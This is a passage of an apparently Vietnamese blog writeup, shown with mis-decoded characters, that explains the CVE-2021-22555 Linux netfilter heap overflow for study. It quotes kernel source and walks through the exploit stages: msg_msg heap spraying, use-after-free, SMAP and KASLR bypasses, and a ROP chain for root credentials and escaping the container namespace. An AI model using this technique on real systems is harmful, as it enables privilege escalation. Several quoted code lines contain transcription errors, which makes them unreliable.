thÃ¡c lá»—i Format Strings","uri":"https://minhlongmt183.github.io/posts/format-string/"},{"content":"\rBÃ i viáº¿t nÃ y nháº±m má»¥c Ä‘Ã­ch há»c táº­p cÃ¡ nhÃ¢n, ghi láº¡i nhá»¯ng kiáº¿n thá»©c Ä‘Ã£ há»c Ä‘á»ƒ nhá»› vÃ  hiá»ƒu rÃµ hÆ¡n. BÃ i viáº¿t tham kháº£o chá»§ yáº¿u tá»« CVE-2021-22555: Turning \\x00\\x00 into 10000$, pháº§n lá»›n lÃ  dá»‹ch tá»« bÃ i viáº¿t gá»‘c cá»™ng thÃªm má»™t sá»‘ lÃ­ giáº£i cá»§a tÃ´i.\rTá»•ng quan vá» lá»— há»•ng Lá»— há»—ng cho phÃ©p viáº¿t dá»¯ liá»‡u bÃªn ngoÃ i vÃ¹ng cho phÃ©p trÃªn heap (heap out-of-bound) Nhá»¯ng phiÃªn báº£n bá»‹ áº£nh hÆ°á»Ÿng: Linux kernel *v2.6.19-rc1 - v5.12-rc8 MÃ´i trÆ°á»ng thá»±c thi, kiá»ƒm thá»­ Ubuntu 20.04 Linux kernel: 5.8.0-48-gen PhÃ¢n tÃ­ch lá»— há»•ng Lá»— há»•ng Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh náº±m á»Ÿ trong hÃ m xt_compat_target_from_user cá»§a /net/netfilter/x_tables.c: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr, unsigned int *size) { const struct xt_target *target = t-\u0026gt;u.kernel.target; struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t; int pad, off = xt_compat_target_offset(target); u_int16_t tsize = ct-\u0026gt;u.user.target_size; char name[sizeof(t-\u0026gt;u.user.name)]; t = *dstptr; memcpy(t, ct, sizeof(*ct)); if (target-\u0026gt;compat_from_user) target-\u0026gt;compat_from_user(t-\u0026gt;data, ct-\u0026gt;data); else memcpy(t-\u0026gt;data, ct-\u0026gt;data, tsize - sizeof(*ct)); pad = XT_ALIGN(target-\u0026gt;targetsize) - target-\u0026gt;targetsize; if (pad \u0026gt; 0) memset(t-\u0026gt;data + target-\u0026gt;targetsize, 0, pad); tsize += off; t-\u0026gt;u.user.target_size = tsize; strlcpy(name, target-\u0026gt;name, sizeof(name)); module_put(target-\u0026gt;me); strncpy(t-\u0026gt;u.user.name, name, sizeof(t-\u0026gt;u.user.name)); *size += off; *dstptr += tsize; } táº¡i line 17-18 chÆ°Æ¡ng trÃ¬nh sao chÃ©p pad kÃ­ tá»± 0 vÃ o vÃ¹ng nhá»› báº¯t Ä‘áº§u báº±ng t-\u0026gt;data + target-\u0026gt;targetsize. Trong trÆ°á»ng há»£p nÃ y, target-\u0026gt;targetsize khÃ´ng bá»‹ kiá»ƒm tra, do Ä‘Ã³ nÃ³ cÃ³ thá»ƒ chá»©a báº¥t kÃ¬ giÃ¡ trá»‹ nÃ o, ká»ƒ cáº£ giÃ¡ trá»‹ Ã¢m. ChÃºng ta khÃ´ng thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c giÃ¡ trá»‹ cá»§a target-\u0026gt;targetsize nhÆ°ng cÃ³ thá»ƒ sá»­ dá»¥ng nhiá»u target vá»›i nhiá»u kÃ­ch thÆ°á»›c khÃ¡c nhau bá»Ÿi tÃªn cá»§a chÃºng. VÃ­ dá»¥ nhÆ° (TCPMSS, TTL, NFQUEUE) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 // net/netfilter/x_NFLOG.c static struct xt_target nflog_tg_reg __read_mostly = { .name = \u0026#34;NFLOG\u0026#34;, .revision = 0, .family = NFPROTO_UNSPEC, .checkentry = nflog_tg_check, .destroy = nflog_tg_destroy, .target = nflog_tg, .targetsize = sizeof(struct xt_nflog_info), .me = THIS_MODULE, }; // net/netfilter/x_NFQUEUE.c static struct xt_target nfqueue_tg_reg[] __read_mostly = { { .name = \u0026#34;NFQUEUE\u0026#34;, .family = NFPROTO_UNSPEC, .target = nfqueue_tg, .targetsize = sizeof(struct xt_NFQ_info), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 1, .family = NFPROTOR_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v1, .targetsize = sizeof(struct xt_NFQ_info_v1), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 2, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v2, .targetsize = sizeof(struct xt_NFQ_info_v2), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 2, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v2, .targetsize = sizeof(struct xt_NFQ_info_v2), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 3, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .targetsize = sizeof(struct xt_NFQ_info_v3), .me = THIS_MODULE, }, }; target size khÃ´ng Ä‘Æ°á»£c cÄƒn chá»‰nh 8 bytes Ä‘á»ƒ Ä‘iá»n khi pad \u0026gt; 0, do Ä‘Ã³, target size cÃ ng lá»›n thÃ¬ offset cÃ ng lá»›n. target size cÃ³ kÃ­ch thÆ°á»›c lá»›n nháº¥t mÃ  tÃ¡c giáº£ tÃ¬m Ä‘Æ°á»£c lÃ  NFLOG, vá»›i nÃ³, chÃºng ta cÃ³ thá»ƒ chá»n offset lÃªn Ä‘áº¿n 0x4c out-of-bounds (chÃºng ta cÃ³ thá»ƒ thay Ä‘á»•i offset báº±ng cÃ¡ch thÃªm padding vÃ o giá»¯a 2 cáº¥u trÃºc struct xt_entry_match vÃ  struct xt_entry_target): 1 2 3 4 5 6 7 8 9 struct xt_nflog_info{ /* \u0026#39;len\u0026#39; will be used iff you set XT_NFLOG_F_COPY_LEN in flags */ __u32 len; __u16 group; __u16 threshold; __u16 flags; __u16 pad; char prefix[64]; }; BÃªn cáº¡nh Ä‘Ã³, t-\u0026gt;data Ä‘Æ°á»£c cáº¥p phÃ¡t bá»Ÿi hÃ m xt_alloc_table_info trong /net/netfilter/x_tables.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 struct xt_table_info *xt_alloc_table_info(unsigned int size) { struct xt_table_info *info = NULL; size_t sz = sizeof(*info) + size; if (sz \u0026lt; sizeof(*info) || sz \u0026gt;= XT_MAX_TABLE_SIZE) return NULL; info = kvmalloc(sz, GFP_KERNEL_ACCOUNT); if (!info) return NULL; memset(info, 0, sizeof(*info)); info-\u0026gt;size = size; return info; } VÃ¹ng nhá»› Ä‘Æ°á»£c ghi cáº¥p phÃ¡t á»Ÿ line 9 vá»›i flag GFP_KERNEL_ACCOUNT vÃ  kÃ­ch thÆ°á»›c lÃ  sz\nMáº·c dÃ¹ váº­y, kÃ­ch thÆ°á»›c tá»‘i thiá»ƒu \u0026gt; 0x100, cÃ³ nghÄ©a kÃ­ch thÆ°á»›c nhá» nháº¥t cá»§a Ä‘á»‘i tÆ°á»£ng cÃ³ thá»ƒ cáº¥p phÃ¡t lÃ  kmalloc-512. ChÃºng ta tÃ¬m Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c cáº¥p phÃ¡t giá»¯a kmalloc-512 vÃ  kmalloc-8192 Ä‘á»ƒ khai thÃ¡c.\nTáº¡i sao biáº¿t 0x100? size lÃ  Ä‘á»‘i tÆ°á»£ng chÃºng ta truyá»n vÃ o, do Ä‘Ã³, Ä‘á»ƒ biáº¿t cáº§n trace xem hÃ m nÃ y Ä‘Æ°á»£c gá»i á»Ÿ Ä‘Ã¢u? VÃ¬ kÃ­ch thÆ°á»›c cá»§a struct xt_table_info = 0x100\rKÃ­ch thÆ°á»›c SIZE nÃ y chÃºng ta kiá»ƒm soÃ¡t Ä‘Æ°á»£c báº±ng cÃ¡ch tÃ¬m xem hÃ m xt_alloc_table_info Ä‘Æ°á»£c gá»i, vÃ­ dá»¥ nhÆ° hÃ m static int compat_do_replace(): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 static int compat_do_replace(struct net *net, void __user *user, unsigned int len) { int ret; struct compat_ipt_replace tmp; struct xt_table_info *newinfo; void *loc_cpu_entry; struct ipt_entry *iter; if (copy_from_user(\u0026amp;tmp, user, sizeof(tmp)) != 0) // size cá»§a tmp Ä‘Æ°á»£c xÃ¡c Ä‘á»‹n bá»Ÿi user return -EFAULT; /* overflow check */ if (tmp.num_counters \u0026gt;= INT_MAX / sizeof(struct xt_counters)) return -ENOMEM; if (tmp.num_counters == 0) return -EINVAL; tmp.name[sizeof(tmp.name)-1] = 0; newinfo = xt_alloc_table_info(tmp.size); // size cá»§a tmp Ä‘Æ°á»£c truyá»n vÃ o ...... } VÃ¬ t-\u0026gt;data chÃºng ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c thÃ´ng qua size, nÃªn bÃ¢y giá» ta tÃ¬m cÃ¡ch Ä‘Æ°a nÃ³ vá» cuá»‘i cÃ¹ng cá»§a heap block. Ta xem xÃ©t hÃ m compat_copy_entry_from_user 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static void compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr, unsigned int *size, struct xt_table_info *newinfo, unsigned char *base) { struct xt_entry_target *t; struct ipt_entry *de; unsigned int origsize; int h; struct xt_entry_match *ematch; origsize = *size; de = *dstptr; memcpy(de, e, sizeof(struct ipt_entry)); memcpy(\u0026amp;de-\u0026gt;counters, \u0026amp;e-\u0026gt;counters, sizeof(e-\u0026gt;counters)); *dstptr += sizeof(struct ipt_entry); *size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry); xt_ematch_foreach(ematch, e) xt_compat_match_from_user(ematch, dstptr, size); de-\u0026gt;target_offset = e-\u0026gt;target_offset - (origsize - *size); t = compat_ipt_get_target(e); xt_compat_target_from_user(t, dstptr, size); de-\u0026gt;next_offset = e-\u0026gt;next_offset - (origsize - *size); for (h = 0; h \u0026lt; NF_INET_NUMHOOKS; h++) { if ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;hook_entry[h]) newinfo-\u0026gt;hook_entry[h] -= origsize - *size; if ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;underflow[h]) newinfo-\u0026gt;underflow[h] -= origsize - *size; } } ChÃºng ta tháº¥y táº¡i line 15 dÃ²ng lá»‡nh *dstptr += sizeof(struct ipt_entry); sáº½ Ä‘áº©y con trá» t-\u0026gt;data vá» phÃ­a cuá»‘i cá»§a heap gáº§n hÆ¡n. Sau Ä‘Ã³, trong hÃ m xt_compat_match_from_user táº¡i line 25, con trá» dstptr tiáº¿p tá»¥c Ä‘Æ°á»£c cá»™ng *dstptr += msize lÃ m cho t-\u0026gt;data thÃªm má»™t láº§n ná»¯a cháº¡y gáº§n vá» phÃ­a cuá»‘i heap hÆ¡n. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr, unsigned int *size) { const struct xt_match *match = m-\u0026gt;u.kernel.match; struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m; int pad, off = xt_compat_match_offset(match); u_int16_t msize = cm-\u0026gt;u.user.match_size; char name[sizeof(m-\u0026gt;u.user.name)]; m = *dstptr; memcpy(m, cm, sizeof(*cm)); if (match-\u0026gt;compat_from_user) match-\u0026gt;compat_from_user(m-\u0026gt;data, cm-\u0026gt;data); else memcpy(m-\u0026gt;data, cm-\u0026gt;data, msize - sizeof(*cm)); pad = XT_ALIGN(match-\u0026gt;matchsize) - match-\u0026gt;matchsize if (pad \u0026gt; 0) memset(m-\u0026gt;data + match-\u0026gt;matchsize, 0, pad); msize += off; m-\u0026gt;u.user.match_size = msize; strlcpy(name, match-\u0026gt;name, sizeof(name)); module_put(match-\u0026gt;me); strncpy(m-\u0026gt;u.user.name, name, sizeof(m-\u0026gt;u.user.name)); *size += off; *dstptr += msize; } vÃ  msize Ä‘Æ°á»£c kiá»ƒm soÃ¡t báº±ng cÃ¡ch xÃ¢y dá»±ng cáº¥u trÃºc dá»¯ liá»‡u á»Ÿ táº§ng user. Do Ä‘Ã³, chÃºng ta cÃ³ má»™t chiáº¿n lÆ°á»£c, lÃ  kiá»ƒm soÃ¡t msize -\u0026gt; dstptr-\u0026gt;t-\u0026gt;data vá» cuá»‘i cÃ¹ng cá»§a heap block, sau Ä‘Ã³ kiá»ƒm soÃ¡t target-\u0026gt;targetsize Ä‘á»ƒ ghi vÃ o ná»™i dung vÃ o heap block tiáº¿p theo.\nKhai thÃ¡c lá»— há»•ng struct msg_msg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // include/linux/msg.h /* one msg_msg struct for each message */ struct msg_msg{ struct list_head m_list; long m_type; size_t m_ts; /* message text size */ struct *security; /* the actual message follows immediately */ }; // include/linux/types.h struct list_head { struct list_head *next, *prev; }; // ipc/msgutils.c struct msg_msgseg{ struct msg_msgseg *next; /* The next part of the message follow immediately*/ }; struct msg_msg Ä‘Æ°á»£c cáº¥p phÃ¡t bá»Ÿi lá»i gá»i há»‡ thá»‘ng msgsnd trong ipc/msgutil.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 static struct msg_msg *alloc_msg(size_t len) { struct msg_msg *msg; struct msg_msgseg **pseg; size_t alen; alen = min(len, DATALEN_MSG); msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); if (msg == NULL) return NULL; msg-\u0026gt;next = NULL; msg-\u0026gt;security = NULL; len -= alen; pseg = \u0026amp;msg-\u0026gt;next; while (len \u0026gt; 0){ struct msg_msgseg *seg; cond_resched(); alen = min(len, DATALEN_SEG); seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT); if (seg == NULL) goto out_err; *pseg = seg; pseg = \u0026amp;seg-\u0026gt;next; len -= alen; } return msg; out_err: free_msg(msg); return NULL; } len lÃ  kÃ­ch thÆ°á»›c dá»¯ liá»‡u cá»§a cáº¥u trÃºc msg_msg.\nTáº¡o ra UAF Nhiá»u message queues Ä‘Æ°á»£c táº¡o khi sá»­ dá»¥ng msgget(). Sau Ä‘Ã³, sá»­ dá»¥ng msgsnd() Ä‘á»ƒ gá»­i message vá»›i kÃ­ch thÆ°á»›c 4096 cho má»—i message queue. Cuá»‘i cÃ¹ng, sau khi gá»­i má»™t sá»‘ lÆ°á»£ng lá»›n cÃ¡c messages, má»™t sá»‘ cáº¥u trÃºc struct msg_msg trong message queue Ä‘Æ°á»£c cáº¥p phÃ¡t liÃªn tá»¥c trÃªn heap.\n. Sau Ä‘Ã³, msgsnd Ä‘á»ƒ gá»­i má»™t message cÃ³ kÃ­ch thÆ°á»›c 1024 tá»›i má»—i message queue. Message cÃ³ kÃ­ch thÆ°á»›c 1024 sáº½ xÃ¢u chuá»—i vá»›i message kÃ­ch thÆ°á»›c 4096 vÃ  lÆ°u trong thÃ nh pháº§n struct list_head cá»§a struct msg_msg.\n. Khi gá»i msgrcv Ä‘á»ƒ Ä‘á»c cÃ¡c pháº§n cá»§a 4096 message, nÃ³ sáº½ giáº£i phÃ³ng vÃ¹ng nhá»› mÃ  cáº¥u trÃºc msg_msg Ä‘Ã£ giá»¯ trÃªn heap.\n. Cuá»‘i cÃ¹ng, khi gá»i hÃ m xt_alloc_table_info Ä‘á»ƒ dÃ¹ng cho nhá»¯ng block 4096 trÃªn heap thÃ¬ nÃ³ Ä‘Ã£ bá»‹ giáº£i phÃ³ng á»Ÿ bÆ°á»›c trÆ°á»›c Ä‘Ã³. LÃ­ tÆ°á»Ÿng, chÃºng ta khÃ´ng nÃªn giáº£i phÃ³ng cáº¥u trÃºc A ngÃ y sau 4096 heap block Ä‘á»ƒ khi gá»i xt_alloc_table_info chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng out-of-bounds Ä‘á»ƒ viáº¿t mÃ£ trá» tá»›i nhá»¯ng byte cuá»‘i cá»§a cáº¥u trÃºc struc msg_msg A m_list.next = 0.\n. CÃ³ má»™t cÆ¡ há»™i ráº±ng 2 4096 struct msg_msg cÃ¹ng trá» tá»›i cung cáº¥u trÃºc 1024 struct msg_msg B, nÃ³ sáº½ tham kháº£o tá»›i má»™t cáº¥u trÃºc 4096 struct msg_msg khÃ¡c vÃ  UAF sáº½ xuáº¥t hiá»‡n.\n. Äá»ƒ xÃ¡c Ä‘á»‹nh cáº¥u trÃºc struct msg_msg B cÃ³ Ä‘ang bá»‹ trá» tá»›i 2 láº§n hay khÃ´ng, ta gá»­i message cÃ³ ná»™i dung tÆ°Æ¡ng á»©ng vá»›i sá»‘ thá»© tá»± cá»§a message: vÃ­ dá»¥ mesage 1 cÃ³ ná»™i dung lÃ  1, message 2 cÃ³ ná»™i dung lÃ  2, \u0026hellip;. message thá»© 4096 cÃ³ ná»™i dung lÃ  4096. Khi lá»—i xáº£y ra, má»—i message cá»§a hÃ ng Ä‘á»£i Ä‘á»u Ä‘Æ°á»£c Ä‘á»c qua, náº¿u tÃ­nh nÄƒng nÃ o cá»§a cáº¥u trÃºc B cÃ³ ná»™i dung khÃ´ng tÆ°Æ¡ng á»©ng vá»›i chá»‰ má»¥c, cÃ³ nghÄ©a nÃ³ khÃ´ng náº±m trong hÃ ng Ä‘á»£i, Ä‘iá»u nÃ y cÅ©ng cÃ³ nghÄ©a cáº¥u trÃºc B Ä‘ang tá»“n táº¡i 2 struct trá» tá»›i nÃ³. Bypass SMAP Äáº¿n Ä‘Ã¢y, struct msg_msg B Ä‘ang bá»‹ double referemced, cÃ¡i thá»© nháº¥t giáº£i phÃ³ng tháº±ng B, vÃ  cÃ¡i cÃ²n láº¡i trÃ² tá»›i B chÃºng ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c. BÃ¢y giá» chÃºng ta dÃ¹ng hÃ m socketpair() Ä‘á»ƒ spray heap, spray lÆ°á»£ng lá»›n cÃ¡c message vá»›i kÃ­ch thÆ°á»›c 1024 vÃ  táº¡o ra má»™t fake struct struct msg_msg structure. lÃ½ tÆ°á»Ÿng chÃºng ta cÃ³ thá»ƒ phá»¥c há»“i cáº¥u trÃºc msg_msg B Ä‘Ã£ bá»‹ giáº£i phÃ³ng.\nChÃº Ã½ ráº±ng mlist.next lÃ  41414141 vÃ¬ chÃºng ta khÃ´ng biáº¿t Ä‘á»‹a chá»‰ cá»§a kernel (khi SMAP Ä‘Æ°á»£c báº­t, chÃºng ta khÃ´ng thá»ƒ tÃ­nh ra Ä‘á»‹a chá»‰ cá»¥ thá»ƒ cá»§a user). KhÃ´ng cÃ³ Ä‘á»‹a chá»‰ cá»§a kernel thÃ¬ ráº¥t quan trá»ng vÃ¬ nÃ³ lÃ m chÃºng ta khÃ´ng thá»ƒ giáº£i phÃ³ng vÃ¹ng nhá»› 1 láº§n ná»¯a. NguyÃªn nhÃ¢n lÃ  trong khi hÃ m msgrcv(), message dÆ°á»£c há»§y liÃªn káº¿t khá»i hÃ ng Ä‘á»£i lÃ  má»™t danh sÃ¡ch vÃ²ng trÃ²n. Má»™t sá»‘ trÆ°á»ng cá»§a cáº¥u trÃºc struct msg_msg cho phÃ©p chÃºng ta leak Ä‘Æ°á»£c nhá»¯ng thÃ´ng tin nÃ y. Cá»¥ thá»ƒ, trÆ°á»ng m_ts Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh lÆ°á»£ng dá»¯ liá»‡u tráº£ vá» cho userland: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/ipc/msgutil.c struct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst) { struct msg_msgseg *dst_pseg, *src_pseg; size_t len = src-\u0026gt;m_ts; size_t alen; if (src-\u0026gt;m_ts \u0026gt; dst-\u0026gt;m_ts) return ERR_PTR(-EINVAL); alen = min(len, DATALEN_MSG); memcpy(dst + 1, src + 1, alen); ... return dst; } KÃ­ch thÆ°á»›c ban Ä‘áº§u cá»§a message nÃ y lÃ  1024-sizeof(struct msg_msg) bytes, chÃºng ta cÃ³ thá»ƒ táº¡o DATALEN_MSG=4096-xizeof(struct msg_msg). Do Ä‘Ã³ chÃºng ta cÃ³ thá»ƒ leak Ä‘Æ°á»£c thÃ´ng tin tá»« header cá»§a struct msg_msg trong message káº¿ tiáº¿p. message queue Ä‘Æ°á»£c hiá»‡n thá»±c nhÆ°ng 1 danh sÃ¡ch vÃ²ng trÃ²n, do Ä‘Ã³, mlist.next sáº½ trá» vá» message chÃ­nh.\nKhi biáº¿t Ä‘Æ°á»£c Ä‘á»‹a chá»‰ cá»§a message chÃ­nh, chÃºng ta cÃ³ thá»ƒ táº¡o láº¡i fake strct msg_msg vá»›i Ä‘áº¡i chá»‰ lÃ  next (segment tiáº¿p theo). Ná»™i dung cá»§a message chÃ­nh cÃ³ thá»ƒ Ä‘Æ°á»£c leak báº±ng cÃ¡ch Ä‘á»c nhiá»u hÆ¡n DATALEN_MSG bytes. Äá»‹a chá»‰ cá»§a con trá» mlist.next Ä‘Æ°á»£c leak tá»« message chÃ­nh sáº½ tiáº¿t lá»™ Ä‘áº¡i chá»‰ cáº£u message thá»© 2, nÃ³ náº±m ká» cáº¥u trÃºc struct msg_msg mÃ  chung ta muá»‘n lÃ m giáº£. Láº¥y Ä‘á»‹a chá»‰ nÃ y tá»« Ä‘i 1024 chÃºng ta sáº½ cÃ³ Ä‘Æ°á»£c Ä‘á»‹a chá»‰ cá»§a message mÃ  chÃºng ta muá»‘n kiá»ƒm soÃ¡t.\nváº«n chÆ°a hiá»ƒu primary message lÃ  gÃ¬? trá» nhÆ° tháº¿ nÃ o? Äá»c kÄ© hÆ¡n pháº§n phÃ¢n tÃ­ch POC, flow thÃ¬ sáº½ hiá»ƒu rÃµ\rMá»™t user-after-free tá»‘t hÆ¡n. Tá»›i Ä‘Ã¢y chÃºng ta pháº£i xÃ¢y dá»±ng Ä‘Æ°á»£c má»™t cáº¥u trÃºc giáº£ struct msg_msg vá»›i Ä‘á»‹a chá»‰ leak Ä‘Æ°á»£c lÃ  mlist.next vÃ  mlist.prev (nghÄ©a lÃ  nÃ³ tá»± trá» tá»›i chÃ­nh nÃ³), bÃ¢y giá» lÃ m sao Ä‘á»ƒ fake message bá»‹ free trong hÃ ng Ä‘á»£i fake message -queue. Khi sá»­ dá»¥ng unix sockets, chÃºng ta cÃ³ má»™t Ä‘á»‘i tÆ°á»£ng struct sk_buff trá» tá»›i fake message. Äiá»u nÃ y cÃ³ nghÄ©a khi chÃºng ta giáº£i phÃ³ng tin nháº¯n giáº£ cá»§a mÃ¬nh, tham tháº£o tá»›i nÃ³ váº«n cÃ²n tá»“n á»Ÿ Ä‘Ã³.\ndá»¯ liá»‡u cá»§a vÃ¹ng nhá»› trÃªn struct sk_buff lÃ  má»™t cháº¥t liá»‡u tuyá»‡t vá»i Ä‘á»ƒ khai thÃ¡c, vÃ¬ nÃ³ khÃ´ng chÆ°a thÃ´ng tin tiÃªu Ä‘á» nÃ o, nghÄ©a lÃ  chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng nÃ³ Ä‘á»ƒ giáº£i phÃ³ng báº¥t kÃ¬ Ä‘á»‘i tÆ°á»£ng nÃ o trÃªn vÃ¹ng nhá»› nÃ y. Trong khi Ä‘Ã³, náº¿u so sÃ¡nh vá»›i ká»‹ch báº£n uaf thÃ¬ chÃºng ta pháº£i giáº£i phÃ³ng Ä‘á»‘i tÆ°á»£ng struct msg_msg, Ä‘iá»u nÃ y chá»‰ Ä‘Æ°á»£c thá»±c hiá»‡n náº¿u hai pháº§n tá»­ Ä‘áº§u tiÃªn cá»§a con trá» cÃ³ thá»ƒ ghi Ä‘Æ°á»£c TÃ¬m Ä‘á»‘i tÆ°á»£ng khai thÃ¡c Äá»‘i tÆ°á»£ng khai thÃ¡c tá»‘t nháº¥t lÃ  Ä‘á»‘i tÆ°á»£ng cÃ³ con trá» hÃ m trong cáº¥u trÃºc nÃ y. Victim pháº£i cáº¥p phÃ¡t vá»›i GFP_KERNEL_ACCOUNt\nCáº¥u trÃºc struct pipe_buffer Ä‘Æ°á»£c cáº¥p phÃ¡t trÃ²ng kmalloc-1024 (Ä‘Ã¢y lÃ  lÃ­ do táº¡i sao mesage thá»© 2 lÃ  1024 bytes). Cáº¥u trÃºc struct pipe_buffer cÃ³ thá»ƒ Ä‘Æ°á»£c cáº¥p phÃ¡t dá»… dÃ ng vá»›i pipe() mÃ  cÃ³ hÃ m alloc_pipe_info() nhÆ° má»™t chÆ°Æ¡ng trÃ¬nh con: 1 2 3 4 5 6 7 8 9 10 11 12 13 // https://git.kernel.org/pub/scm/linux/kernel/git/torvals/linux.git/tree/fs/pipe.c struct pipe_inode_info *alloc_pipe_info(void) { ... unsigned long pipe_bufs = PIPE_DEF_BUFFERS; ... pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); if (pipe == NULL) goto out_free_uid; ... pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT); ... } NÃ³ khÃ´ng trá»±c tiáº¿p chá»©a con trá» hÃ m, nÃ³ chá»©a con trá» tá»›i cáº¥u trÃºc struct pipe_buf_operations mÃ  cáº¥u trÃºc nÃ y láº¡i cÃ³ con trá» hÃ m mÃ  chÃºng ta cáº§n:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h struct pipe_buffer{ struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; struct pipe_buf_operations { ... /* * When The contents of this pipe buffer has been completely * consumed by a reader, -\u0026gt;release() is called. */ void (*release)(struct pipe_node_info *, struct pipe_buffer *); ... }; Bypassing KASLR/SMEP Khi viáº¿t vÃ o pipes, cÃ¢u trÃºc struct pipe_buffer bá»‹ ghi Ä‘Ã¨, trong Ä‘Ã³ ops nÃ³ trá» tá»›i má»™t cáº¥u trÃºc tÄ©nh náº±m trÃªn .data segment: anon_pipe_buf_ops:\n1 2 3 4 5 6 // https://git.kernel.org/pub/scm/linux/kernel/git/tovalds/linux.git/tree/fs/pipe.c static const struct pipe_buf_operations alloc_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; VÃ¬ khoáº£ng cÃ¡ch giá»¯a Ä‘á»‹a chá»‰ cá»§a .data segment vÃ  .text khÃ´ng Ä‘á»•i, nÃªn ta tÃ­nh Ä‘Æ°á»£c Ä‘á»‹a chá»‰ cá»§a kernel_base_addr tá»« anon_pipe_buf_ops.\nTÃ­nh nhÆ° tháº¿ nÃ o? MÃ´ táº£ á»Ÿ pháº§n POC\rPhun nhiá»u cáº¥u trÃºc struct pipe_buffer vÃ  chá»‰nh sá»­a láº¡i vá»‹ tyris cá»§a cáº¥u trÃºc struct sk_buff cá»§a data buffer.\nChÃºng ta Ä‘á»c dá»¯ liá»‡u tá»« sk_buff Ä‘á»ƒ leak ná»™i dá»¥ng cá»§a struct pipe_buffer vÃ  láº¥y Ä‘áº¡i chá»‰ cá»§a anon_pipe_buf_ops\nVá»›i thÃ´ng tin nÃ y, chÃºng ta sáº½ tÃ¬m JOP/ROP gadgets. Khi Ä‘á»c tá»« unix socket, chÃºng ta cáº§n giáº£i phÃ³ng vÃ¹ng nhá»› cá»§a nÃ³.\nNÃ¢ng quyá»n Táº¡o má»™t cáº¥u trÃºc struct pipe_buffer vá»›i má»™ con trá» ops trá» tá»›i má»™t cáº¥u trÃºc struct pipe_buf_operations. Cáº¥u trÃºc nÃ y Ä‘áº·t táº¡i cÃ¹ng Ä‘á»‹a Ä‘iá»ƒm vÃ¬ chÃºng ta biáº¿t Ä‘á»‹a chá»‰ cá»§a nÃ³, chá»©a hÃ m mÃ  chÃºng ta muá»‘n thá»±c thi khi Ä‘Æ°á»£c giáº£i phÃ³ng.\nCuá»‘i cÃ¹ng, Ä‘Ã³ng háº¿t táº¥t cáº£ cÃ¡c pipes =\u0026gt; kÃ­ch hoáº¡t giáº£i phÃ³ng vÃ¹ng nhá»› =\u0026gt; kÃ­ch hoáº¡t JOP chain. Kernel ROP chain LÆ°u Ä‘á»‹a chá»‰ cá»§a RBP táº¡i má»™t sÃ³ Ä‘á»‹a chá»‰ trong kernel Ä‘á»ƒ sá»­ dá»¥ng khi thá»±c thi\n=\u0026gt; gá»i commit_creds(prepare_kernel_cred(NULL)) Ä‘á»ƒ install kernel credentials\n=\u0026gt; gá»i switch_task_namespace(find_task_by_vpid(1), init_nsproxy) Ä‘á»ƒ chuyá»ƒn khÃ´ng gian tÃªn cá»§a tiáº¿n trÃ¬nh 1 tá»›i 1 trong nhá»¯ng tiáº¿n trÃ¬nh khá»Ÿi táº¡o.\n=\u0026gt; khÃ´ phá»¥c giÃ¡ trá»‹ cá»§a RBP vÃ  tráº£ vá» thá»±c thi Ä‘Ã£ dá»«ng (free_pipe_info() tráº£ vá»). 